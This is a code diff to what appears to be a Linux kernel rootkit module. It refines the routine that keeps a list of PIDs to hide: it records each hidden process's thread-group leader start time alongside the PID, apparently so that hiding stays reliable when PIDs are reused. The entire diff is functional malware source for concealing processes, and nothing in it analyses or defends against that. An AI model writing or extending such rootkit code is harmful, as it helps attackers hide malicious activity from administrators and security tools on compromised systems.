@@ -3,6 +3,7 @@
 
 int child_pids[MAX_HIDDEN_PIDS*128];
 int hidden_pids[MAX_HIDDEN_PIDS];
+u64 hidden_start_times[MAX_HIDDEN_PIDS];
 int hidden_count = 0;
 int child_count = 0;
 static DEFINE_SPINLOCK(hidden_pids_lock);
@@ -115,18 +116,35 @@ notrace int is_child_pid(int pid) {
 notrace void add_hidden_pid(int pid) {
     unsigned long flags;
     int i;
+    struct task_struct *task;
+    struct task_struct *leader;
+    u64 start_time_ns = 0;
 
     if (pid <= 0)
         return;
 
+    rcu_read_lock();
+    task = pid_task(find_vpid(pid), PIDTYPE_PID);
+    if (task) {
+        leader = rcu_dereference(task->group_leader);
+        if (!leader)
+            leader = task;
+        start_time_ns = READ_ONCE(leader->start_time);
+    }
+    rcu_read_unlock();
+
     spin_lock_irqsave(&hidden_pids_lock, flags);
     for (i = 0; i < hidden_count; i++) {
-         if (hidden_pids[i] == pid)
+         if (hidden_pids[i] == pid) {
+             if (start_time_ns)
+                 hidden_start_times[i] = start_time_ns;
              goto out;
+         }
     }
 
     if (hidden_count < MAX_HIDDEN_PIDS) {
         hidden_pids[hidden_count++] = pid;
+        hidden_start_times[hidden_count - 1] = start_time_ns;
     }
 out:
     spin_unlock_irqrestore(&hidden_pids_lock, flags);
